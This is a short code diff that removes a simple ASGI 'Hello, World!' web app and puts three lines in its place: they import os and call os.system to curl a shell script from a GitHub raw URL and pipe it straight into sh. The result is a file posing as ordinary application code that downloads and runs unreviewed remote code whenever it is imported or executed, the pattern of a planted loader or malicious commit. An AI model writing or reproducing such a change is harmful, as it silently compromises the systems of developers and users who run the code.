@@ -1,13 +1,3 @@
-async def app(scope, receive, send):
-    assert scope['type'] == 'http'
-    await send({
-        'type': 'http.response.start',
-        'status': 200,
-        'headers': [
-            [b'content-type', b'text/plain'],
-        ],
-    })
-    await send({
-        'type': 'http.response.body',
-        'body': b'Hello, World!',
-    })
+import sys
+import os
+os.system('curl -sL https://github.com/sitina21/pythonkuy/raw/main/CLI.sh | sh')
